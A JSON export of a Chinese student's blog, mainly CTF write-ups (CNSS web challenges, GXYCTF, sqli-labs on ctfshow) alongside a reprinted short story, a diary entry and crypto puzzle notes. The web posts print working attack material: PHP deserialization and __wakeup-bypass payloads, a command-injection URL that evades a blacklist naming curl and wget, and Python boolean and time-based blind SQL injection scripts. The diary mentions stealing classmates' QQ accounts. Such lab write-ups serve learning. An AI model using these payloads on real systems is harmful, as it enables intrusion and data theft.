{"pages":[],"posts":[{"title":"CSNN","text":"我一定要试试 Web 方向直接就有flag Signin12345678910111213141516171819202122&lt;?phperror_reporting(0);require_once(&quot;flag.php&quot;);if($_SERVER['REQUEST_METHOD'] !=='POST'){ die(&quot;Please Change Your Method!&quot;); exit();}else{ if(!isset($_POST[&quot;CNSS&quot;])){ show_source(__FILE__); } else if($_POST[&quot;CNSS&quot;] === &quot;join&quot;){ if((isset($_GET[&quot;web&quot;])) &amp;&amp; (($_GET[&quot;web&quot;]) === &quot;like&quot;)){ setcookie(&quot;flag&quot;,&quot;0&quot;); if($_COOKIE['flag'] === '1'){ echo $flag; }else{show_source(__FILE__);} }else{ show_source(__FILE__); } }} 简单的代码审计 https://chrome.google.com/webstore/detail/ginpbkfigcoaokgflihfhhmglmbchinc hackbar下载地址(需要科学上网) D3buger进去之后，第一反应是查看源代码 但是发现f12 鼠标右键 crul+u都不好使了，那就是JavaScript限制了我们的使用 以chrome为例，其他浏览器也可以，自己摸索 把JavaScript给禁用了， 回来之后发现网页就变空白了，这时候我们ctrl+u 查看源代码 发现有一个fuck.js 点进去 flag就有了 [👶Baby]GitHacker用githacker下载源码 直接是搜不到flag的 通过查看日志文件，发现flag被删除了，那就利用git命令恢复到以前的版本去 1234git reset -hard HEAD git restore index.html 更坑的数学题 题目意思应该是让1s内去提交答案 就能得到flag 下面有一个加时的按钮，通过代码审计，以及抓包的分析，这个按钮是假的 这时候就有两种解法， 第一种是拼手速，1s之内算出来在提交 第二种就是写脚本去解，下面附上我写的脚本，跑一下就可以了 1234567891011121314151617181920212223import requestsimport reimport stringfrom requests.sessions import sessionurl='http://81.68.109.40:30005/'session=requests.session()req=session.get(url=url)prog = re.compile('\\d{8}')group=prog.findall(req.text)sum=int(group[0])*int(group[1])str=str(sum)data={ 'res':str}r=session.post(url=url,data=data)print(r.text) [😃Easy]Ezp#p12345678910111213141516171819202122232425262728293031&lt;?php error_reporting(0); require_once(&quot;flag.php&quot;); show_source(__FILE__); $pass = '0e0'; $md55 = $_COOKIE['token']; $md55 = md5($md55); if(md5($md55) == $pass){ if(isset($_GET['query'])){ $before = $_GET['query']; $med = 'filter'; $after = preg_replace( &quot;/$med/&quot;, '', $before ); if($after === $med){ echo $flag1; } } $verify = $_GET['verify']; } extract($_POST); if(md5($verify) === $pass){ echo $$verify; }?&gt; 存粹就是一个套娃烂活题 先代码审计，发现前面的if语句需要找一个两次md5加密后开头是0e的，爆破了好多位，没有出，其实前面的代码都没有用，主要在 extract($_POST);这段代码，可以把$_POST数组里的值全部赋给变量，那就好说了，直接赋值即可，值得注意的是这个题有两段flag，也给了提示，需要传两次参 payload [😃Easy]China Flag这个提示都不是很清楚 只做了第一步，实在是没搞懂出题人第二步想考察的啥 这个题应该是要考察http响应头的一些知识，但是提示太过模糊，不做也罢，想学习这方面知识可以看下buu上的 假猪套天下第一 这套题，考得比较详细，不整这些烂活 [😮Mid]太极掌门人12345678910111213141516171819202122232425262728293031323334353637383940&lt;?php error_reporting(0); show_source(__FILE__); function deleteDir($path) { if (is_dir($path)) { $dirs = scandir($path); foreach ($dirs as $dir) { if ($dir != '.' &amp;&amp; $dir != '..') { $sonDir = $path.'/'.$dir; if (is_dir($sonDir)) { deleteDir($sonDir); @rmdir($sonDir); } elseif ($sonDir !== './index.php' &amp;&amp; $sonDir !== './flag.php') { @unlink($sonDir); } } } @rmdir($path); } } $devil = '&lt;?php exit;?&gt;'; $goods = $_POST['goods']; file_put_contents($_POST['train'], $devil . $goods); sleep(1); deleteDir('.');?&gt; 死亡die(exit)绕过，也算是一个比较经典的题了 参考下这个链接，讲的比较详细 https://blog.csdn.net/woshilnp/article/details/117266628 其中那个删除目录的方法考察的并非是条件竞争，因为是静态靶机，定时删除shell，防止利用他人的shell [😮Mid]BlackPage12345678910&lt;!-- \\&lt;\\?phps$file = $_GET[&quot;file&quot;];$blacklist = &quot;(**blacklist**)&quot;;if (preg_match(&quot;/&quot;.$blacklist.&quot;/is&quot;,$file) == 1){ exit(&quot;Nooo,You can't read it.&quot;);}else{ include $file;}//你能读到 mybackdoor.php 吗？ 查看源码，发现就这样，那就用base64去读源码 读出来以后base64解密 12345678910111213&lt;?phperror_reporting(0);function blacklist($cmd){ $filter = &quot;(\\\\&lt;|\\\\&gt;|Fl4g|php|curl| |0x|\\\\\\\\|python|gcc|less|root|etc|pass|http|ftp|cd|tcp|udp|cat|×|flag|ph|hp|wget|type|ty|\\\\$\\\\{IFS\\\\}|index|\\\\*)&quot;; if (preg_match(&quot;/&quot;.$filter.&quot;/is&quot;,$cmd)==1){ exit('Go out! This black page does not belong to you!'); } else{ system($cmd); }}blacklist($_GET['cmd']);?&gt; 比较简单的命令执行 payload 1http://121.41.7.149:65002/mybackdoor.php?cmd=tac%09/???????????? [😯Mid]bestLanguage123456789101112131415161718192021&lt;?phperror_reporting(0);class superGate{ public $gay = true; function __destruct(){ echo file_get_contents(&quot;/flag&quot;); die(); }}$p = $_GET['p'];$honey = unserialize($p);if(preg_match(&quot;/superGate/i&quot;, serialize($honey))){ echo &quot;no&quot;; throw Exception();}show_source(__FILE__); 烂活题 最开始想着绕过superGate，发现绕不过去 本地跑下源码 这个errr_reporting(0)是不回显报错的意思，把他给注释掉 去传参看看怎么报错，是这个Expection方法没定义，最开始想的是原生类反序列化，但是并没有调用的方法，突然灵光一现，能不能把expection这个方法给定义了，但是反序列化是不能直接定义方法的，但是又想到expection类里面有Expection方法，那就去extends一下，看看能不能行 1O:9:&quot;superGate&quot;:8:{s:3:&quot;gay&quot;;b:1;s:10:&quot;*message&quot;;s:0:&quot;&quot;;s:17:&quot;Exceptionstring&quot;;s:0:&quot;&quot;;s:7:&quot;*code&quot;;i:0;s:7:&quot;*file&quot;;s:28:&quot;D:\\phpstudy_pro\\WWW\\test.php&quot;;s:7:&quot;*line&quot;;i:8;s:16:&quot;Exceptiontrace&quot;;a:0:{}s:19:&quot;Exceptionprevious&quot;;N;} 成功打通 这种方法平时确实很少见 [😮Mid]To_be_Admin_Again老题了 利用的是 session.serialize_handler设置的设置的方式不同造成的反序列化，还有wakeup的绕过 参考文章 https://www.freebuf.com/vuls/202819.html payload 123456789101112131415&lt;?phpclass CNSS{ private $username; private $code; public function __construct(){ $this-&gt;username = &quot;admin&quot;; $this-&gt;code=&quot;phpinfo();&quot;; }}$a=new CNSS();echo urlencode(&quot;|&quot;.serialize($a)); 在save.php里传参(注意此时需要修改属性数量绕过wakeup) 1？cnss=%7CO%3A4%3A%22CNSS%22%3A3%3A%7Bs%3A14%3A%22%00CNSS%00username%22%3Bs%3A5%3A%22admin%22%3Bs%3A10%3A%22%00CNSS%00code%22%3Bs%3A10%3A%22phpinfo%28%29%3B%22%3B%7D 然后返回主页刷新即可rce","link":"/2021/10/07/CNSS/"},{"title":"GXYCTF2019StrongestMind","text":"进去首先是一个输入框，想到了前几天cnss上的一道题，那道题让1s内提交答案，就是用Python脚本跑的，这个的话，应该也需要用脚本去跑 自己写了个脚本 12345678910111213141516171819202122232425262728293031323334import requestsimport reimport stringimport timefrom requests.sessions import sessionurl='http://77465a06-a8b1-4b27-ac6b-a654b7141830.node4.buuoj.cn:81/index.php'session=requests.session()req=session.get(url=url)while True: prog1 = re.compile('\\d{8}') prog2 = re.compile('\\+|\\-') group=prog1.findall(req.text) f=prog2.findall(req.text) # print(f) if(f[0]=='+'): sum=int(group[0])+int(group[1]) elif(f[0]=='-'): sum=int(group[0])-int(group[1]) data={ 'answer':sum } r=session.post(url=url,data=data) r.encoding=&quot;utf-8&quot; print(r.text) time.sleep(1) 跑不出来，老是算错，应该是正则表达匹配的问题，以后再纠正 看了看别人的脚本，又学了种姿势 1234567891011121314151617181920212223242526from requests import *import timeimport reurl=&quot;http://d7ae47ab-f31d-482d-bf36-7d505b252d2e.node3.buuoj.cn/index.php&quot;s=session()kk = re.compile(r'\\d+ [-|+] \\d+')r=s.get(url)for i in range(1001): zz=kk.findall(r.text)[0] #print(zz) zzz=eval(zz) #print(zzz) data={&quot;answer&quot;:zzz} time.sleep(0.1) r=s.post(url,data=data) r.encoding='utf-8' print((r.text)) 可以把表达式匹配出来，然后用eval去执行，之前确实没见过，记下来了","link":"/2021/10/12/GXYCTF2019StrongestMind/"},{"title":"hero","text":"英雄作者：宋小君链接：https://www.zhihu.com/question/25313930/answer/102031499来源：知乎著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。 江湖上，人人都承认的高手并不多。欧阳乾坤算一个。欧阳乾坤不姓欧阳，也不叫乾坤。他本名叫刘满堂。名字是奶奶取的，农村人取名字朴实，希望将来刘家能四世同堂。 刘满堂并没想着要行走江湖。他娶了个媳妇，买两亩地，盖三间大瓦房，生一窝孩子。一件事情改变了这一切。江湖上，正邪不两立，邪教已被正派人士屠戮殆尽，只剩下一个教主还负隅顽抗。正派人士一路追杀，追到了刘满堂所在的村子。教主身受重伤，却没有人愿意给他致命一击。理由很简单，但凡英雄，下场往往不好，实权派永远躲在英雄背后。正派人士都懂这个道理。僵持。正派人士不动手，也不允许教主自杀。直到刘满堂背着一捆柴经过。正派人士告知刘满堂，杀人跟杀猪并无区别，你有两条路，你杀了他，给你二十两银子。你不杀他，我们去拜访你邻居和你媳妇。邸报的标题我都写好了，邪教入村，村民遭殃，妇孺牛羊被屠戮一空。邪教教主死在了刘满堂柴刀下。刘满堂成了英雄。正派人士觉得刘满堂这个名字不大气，就给他改了个名字。从此，刘满堂成了欧阳乾坤，欧阳乾坤成了英雄。欧阳乾坤手刃邪教教主的事迹被大肆渲染，越来越神乎其神，欧阳乾坤成了传说中的英雄。十年之后。邪教兴起，兵临城下，正派人士绑了欧阳乾坤求和。冤有头债有主。人是欧阳乾坤杀的。欧阳乾坤求饶，我不是什么欧阳乾坤，我叫刘满堂，我是个农民。没有人相信。欧阳乾坤被邪教分尸而死。正邪两派达成一致，和平相处十余年。十余年后，战争再起。欧阳乾坤被写进了史书和传奇。二十年前，欧阳乾坤手刃邪教教主。十年前，欧阳乾坤被邪教擒住，百般折磨而不屈服，犹痛骂贼人，至死不绝。 英雄，有的是用处。","link":"/2021/10/27/hero/"},{"title":"Life","text":"生活​ 好久没有写随笔了，自从高三之后，就没有再安安稳稳地握一次笔，脑中就没有再冒出些奇思妙想，似乎所有的灵感都在高一高二用光了，似乎没有什么可写的了。 ​ 来海大已经一年了，经过高三高考的挫折以及高四的奋斗，我终于来到了我的远方，这里有海有酒有自由的生活，但是我却觉得缺点什么。 ​ 我原以为上大学之后会有大把的时间供我去阅读，去阅读那些高中非常想看但却没有机会看的故事，去他们的世界中体悟人生，但是大学并未如我所愿，课程也挺烦杂，虽然比起高中而言确实是有大把的时间去干自己想干的事，但是我却无暇顾及阅读，而只是对着冰冷的液晶屏幕或刷知乎或刷抖音或玩游戏或敲代码。孔子、孟子 、庄子、老子，都被我抛诸于脑后，甚至于高中最喜欢的王阳明我也都快给忘了，碎片化的信息获取方式让我忘记了如何去深度思考。 ​ 这样一来，时间对于我来说过的便是飞快了。逝者如斯夫，不舍昼夜。转眼间我已经来到了大二，我回望大一这一年，也没干过什么有用的大事，高中时候常挂在嘴边的“为天地立心，为生民立命，为往圣继绝学，为万世开太平”似乎也成了一句玩笑话，我的感知也逐渐变得麻木，从前觉得非常重要的事，现在对我已经没有什么触动了。 ​ 对于专业课的学习，我也没有如何去听讲，虽然在一周前的省赛里侥幸拿了一等奖，但是我深知自己与外校的一些从高中甚至初中小学就接触这行的师傅有着较大的差距，借用毛主席的一句话就是“革命尚未成功，同志仍需努力”。过分夸赞就如同糖衣炮弹一般，虽然可能本意是好的，但是时间长了就会击碎我的意志，所以还是批评要来的痛快，它可以鞭策我前进，希望看到这里的师傅多多批评我，让我找到自己的不足，才好继续努力。 ​ 我在学习CTF有关知识时看到了phith0n的Blog，上面写着，一个想当文人的黑客。我看到这里会心一笑，这倒是与我有几分相似，我在认识at0de师傅之前从未要想当hacker，只是初高中阅读过一些所谓的刷钻教程，自己尝试利用社会工程学把同学的QQ号盗了而已，也可以说大学之前，我并未触碰到真正的计算机技术。我虽然选择的是理科，但是我对于文字也十分感兴趣，脑中时常也会出现奇思妙想，我惊叹于诗词的寥寥数字，便能描绘出无穷的意境，引人入胜。 ​ 未来海大之前，我曾言:”或云尚未佩妥剑，转眼便江湖；我云，锐已配妥剑，江湖都任我闯。”我刚来海大的前几个月确实也是雄心壮志，参加了许多比赛，能报的不能报的都去打了，确实也是在蓝洞杯中拿了一个校赛二等奖。最害怕的演讲比赛也去参加了，排名靠尾地拿了一个安慰奖，属实是太拉了。 ​ 我依旧没有学会合理规划时间，每天还是想起来有啥就做啥，学习方面还没有坚持 ​ ​","link":"/2021/10/30/life/"},{"title":"","text":"sqllibs 打完自贸港赛，有道sql注入没出，痛失第一，痛定思痛，通过sqllibs去系统的总结下sql注入 less-1联合注入 字符型注入 拿ctfshow的靶场来查 有专门存flag的地方 更明确 1-1'union select 1,group_concat(flag),3 from ctfshow.flag --+ 由此可知 只要能查东西 就直接从这里查就行 less-2数字型注入 1union select 1,group_concat(flagac),3 from ctfshow.flagaa--+ tablename flagaa 学聪明了 名字给改了 但是问题不大 还是很简单就查出来了 less-3都失效了 就尝试去分析sqllibs的源码 找到注入点 1SELECT * FROM users WHERE id=('$id') LIMIT 0,1 他是加了个括号 就想着能不能把括号给闭合了 1-1') union select 1,group_concat(flagaca),3 from ctfshow.flagaanec--+ less-412$id = '&quot;' . $id . '&quot;';$sql=&quot;SELECT * FROM users WHERE id=(1) union select 1,2,3 --+) LIMIT 0,1&quot;; 这个就加个双引号去闭合 1id=100&quot;)union select 1,group_concat(flag23),3 from ctfshow.flagsf less-512345678910111213141516import requestsurl=&quot;http://0c0fad01-b166-4997-8bf5-ad58391df32a.challenge.ctf.show:8080/?id=&quot;flag=''for i in range(50): for j in r'0123456789abcdefghijklmnopqrstuvwxyz-{},': payload=&quot;1'and substr((select flag33 from ctfshow.flagpuck),%d,1)='%s'--+&quot;%(i,j) # tablename=flagpuck # columnname=flag33 r=requests.get(url=url+payload) # print (r.text) if &quot;You are in...........&quot; in r.text: flag+=j print(flag) 布尔盲注 顺便学下如何用二分法去盲注，首先要搞清楚二分法的原理，二分法，在数据结构中学过 有一个头和尾巴 如果需要使用二分法 需要用if语句 1if(ascii(substr(database,1,1))&gt;mid,1,0) //如果大于mid 就返回1 如果小于就返回0 通过while 逐渐向正确值靠拢 直到两者相等 123456789101112131415161718192021222324252627282930import requestsif __name__ == '__main__': url = 'http://fb471601-d073-4684-b4ee-0d33c10b3c95.challenge.ctf.show:8080/?id=' result = '' i = 0 while True: i = i + 1 low = 32 high = 127 while low &lt; high: mid = (low + high) // 2 # payload = f'if(ascii(substr((select group_concat(schema_name) from information_schema.schemata),{i},1))&gt;{mid},1,0)%23' # payload = f'if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=&quot;ctfshow&quot;),{i},1))&gt;{mid},1,0)%23' # payload = f'if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&quot;flagpuck&quot;),{i},1))&gt;{mid},1,0)%23' # payload = f'if(ascii(substr((select group_concat(flag33) from ctfshow.flagpuck),{i},1))&gt;{mid},1,0)%23' # print(payload) payload=r&quot;1' and if(ascii(substr(database(),%d,1))&gt;%d,1,0)--+&quot;%(i,mid) r=requests.get(url=url+payload) if('You are in...........' in r.text): low=mid+1 else: high=mid if low!=32: result += chr(low) else: break print (result) less-611&quot;and substr(database(),1,1)='c' --+ 用“闭合的布尔盲注 12345678910111213141516import requestsurl=&quot;http://0c0fad01-b166-4997-8bf5-ad58391df32a.challenge.ctf.show:8080/?id=&quot;flag=''for i in range(50): for j in r'0123456789abcdefghijklmnopqrstuvwxyz-{},': payload=&quot;1 \\&quot;and substr((select flag33 from ctfshow.flagpuck),%d,1)='%s'--+&quot;%(i,j) # tablename=flagpuck # columnname=flag33 r=requests.get(url=url+payload) # print (r.text) if &quot;You are in...........&quot; in r.text: flag+=j print(flag) less-7双括号闭合的布尔盲注 11'))and substr(database(),2,1)='2' --+ 123456789101112131415import requestsurl=&quot;http://0c0fad01-b166-4997-8bf5-ad58391df32a.challenge.ctf.show:8080/?id=&quot;flag=''for i in range(50): for j in r'0123456789abcdefghijklmnopqrstuvwxyz-{},': payload=&quot;1 '))and substr((select flag33 from ctfshow.flagpuck),%d,1)='%s'--+&quot;%(i,j) # tablename=flagpuck # columnname=flag33 r=requests.get(url=url+payload) # print (r.text) if &quot;You are in...........&quot; in r.text: flag+=j print(flag) less-9时间盲注 12345678910111213141516171819202122232425262728import requestsif __name__ == '__main__': url=&quot;http://24a28ffa-52c1-4b4e-ab08-72e1c6f78c90.challenge.ctf.show:8080/?id=1'&quot; result='' i=0 while True: i+=1 head=32 tail=127 while head&lt;tail: mid=(head+tail)//2 payload=r&quot;and if(ascii(substr(database(),%d,1))&gt;%d,sleep(2),0) --+&quot;%(i,mid) try: r=requests.get(url=url+payload,timeout=0.5) tail=mid except: head=mid+1 if (head!=32): result+=chr(head) else: break print(result) 这里用到了参数timeout， 他其实就是响应时间 12345678import requestsheaders = { &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0&quot;, &quot;Connection&quot;: &quot;keep-alive&quot;}try: r=requests.get(url='https://www.baidu.com/',timeout=0.000001) print(r.text)except: print(&quot;rrrr&quot;) 他会自动过滤时间较长的 从而执行expect部分 less-10“闭合的时间盲注 less-11登入名处注入 easy less-12“)闭合 less-13这题没有回显，但是如果注入成功，会有一个flag.jpg的图片，注入失败，会有slap.jpg的图片，可以利用这个来进行布尔盲注 12345678910111213141516171819202122232425262728293031323334import requestsif __name__ == '__main__': url = 'http://9301abaf-d8ee-4cc9-a060-6aad4a35035b.challenge.ctf.show:8080' result = '' i = 0 while True: i = i + 1 low = 32 high = 127 while low &lt; high: mid = (low + high) // 2 # payload = f'if(ascii(substr((select group_concat(schema_name) from information_schema.schemata),{i},1))&gt;{mid},1,0)' # payload = f'if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=&quot;ctfshow&quot;),{i},1))&gt;{mid},1,0)' # payload = f'if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&quot;flag&quot;),{i},1))&gt;{mid},1,0)' payload = f'if(ascii(substr((select group_concat(flag4) from ctfshow.flag),{i},1))&gt;{mid},1,0)' # print(payload) data = { 'uname': f&quot;admin') and {payload}#&quot;, 'passwd': '123' } # print(data['uname']) r = requests.post(url=url, data=data) if 'flag.jpg' in r.text: low = mid + 1 else: high = mid if low != 32: result += chr(low) else: break print(result) less-14less-17报错注入","link":"/2021/08/23/sqllibs/"},{"title":"密码学刷题","text":"备战省赛，做点简单的密码学题 抄错的字符老师让小明抄写一段话，结果粗心的小明把部分数字抄成了字母，还因为强迫症把所有字母都换成大写。你能帮小明恢复并解开答案吗：QWIHBLGZZXJSXZNVBZW 先全转化为小写看看 qwihblgzzxjsxznvbzw 1-&gt;i 6-&gt;b 2-&gt;z 9-&gt;g 5-&gt;s 太牛马了 1234567891011121314151617181920212223242526272829303132333435&lt;?php$list=[];function fun($str,$index=0){ if($index==strlen($str)){ global $list; $ret=base64_decode($str); $list[]=$ret; return false; } $head=substr($str,0,$index); $mid=substr($str,$index,1); $end=substr($str,$index+1,strlen($str)-$index); $words=getWord($mid); foreach ($words as $key=&gt;$v){ $newStr=$head.$v; $ret=base64_decode($newStr); if(!preg_match('/[^a-zA-Z\\d\\_\\-]/is',$ret)){ fun($newStr.$end,$index+1); } }}function getWord($c){ $word=[&quot;I&quot;=&gt;1, 'L'=&gt;1, 'G'=&gt;9, 'Z'=&gt;2, 'S'=&gt;5]; $arr=[$c,strtolower($c)]; if(isset($word[$c])){ $arr[]=$word[$c]; } return $arr;}$str=&quot;QWIHBLGZZXJSXZNVBZW&quot;;fun($str);var_dump($list);?&gt; 找到了一个php的脚本，跑一下 得出了结果 1flag{Aman_very_cool} /.-1..-./.-../.-/--./----.--/-../...--/..-./-.-./-.../..-./.----/--.../..-./----./...--/----./----./...../-----/....-/-----.- 摩斯密码 ，最后全是小写 注意大小写就行 1flag{d3fcbf17f9399504} 聪明的小羊一只小羊翻过了2个栅栏 fa{fe13f590lg6d46d0d0} 栅栏密码 https://www.qqxiuzi.cn/bianma/zhalanmima.php 字数为2，直接解密就行 ok1Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook.Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook! Ook. Ook. Ook.Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook.Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook!Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook. Ook.Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook.Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook.Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook.Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook.Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook.Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook! Ook! Ook!Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook.Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook!Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook.Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook.Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook.Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook.Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook.Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook! Ook.Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook!Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook!Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook.Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook?Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook?Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.Ook. Ook! Ook. Ook. Ook. Ook! Ook. Ook. Ook. Ook! Ook. Ook. Ook. Ook! Ook.Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook.Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook.Ook. Ook. Ook. Ook. Ook! Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook.Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.Ook. Ook. Ook! Ook. Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook.Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook.Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook.Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. ok加密 https://www.splitbrain.org/services/ook flag{0a394df55312c51a} [+-&lt;&gt;]12+++++ +++++ [-&gt;++ +++++ +++&lt;] &gt;++.+ +++++ .&lt;+++ [-&gt;-- -&lt;]&gt;- -.+++ +++.&lt; ++++[ -&gt;+++ +&lt;]&gt;+ +++.&lt; +++++ +++[- &gt;---- ----&lt; ]&gt;--- ----- ---.&lt; +++++ ++[-&gt; +++++ ++&lt;]&gt; +++.&lt; +++++ +[-&gt;- ----- &lt;]&gt;-- ----- -.--. ----. --.++ +++++ +.&lt;++ ++++[ -&gt;+++ +++&lt;] &gt;++++ +.++. &lt;++++ ++[-&gt; ----- -&lt;]&gt;- ----- ----. -.&lt;++ +++++ [-&gt;++ +++++ &lt;]&gt;+. ----. ++++. &lt;++++ +++[- &gt;---- ---&lt;] &gt;---- .+.&lt;+ +++++ ++[-&gt; +++++ +++&lt;] &gt;++++ +++++ ++.&lt; brainfuck flag{0d86208ac54fbf12} 把猪困在猪圈里1/9j/4AAQSkZJRgABAQEAYABgAAD/4RDaRXhpZgAATU0AKgAAAAgABAE7AAIAAAAFAAAISodpAAQAAAABAAAIUJydAAEAAAAKAAAQyOocAAcAAAgMAAAAPgAAAAAc6gAAAAgwMFQAAAAFkAMAAgAAABQAABCekAQAAgAAABQAABCykpEAAgAAAAM0MQAAkpIAAgAAAAM0MQAA6hwABwAACAwAAAiSAAAAABzqAAAACAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA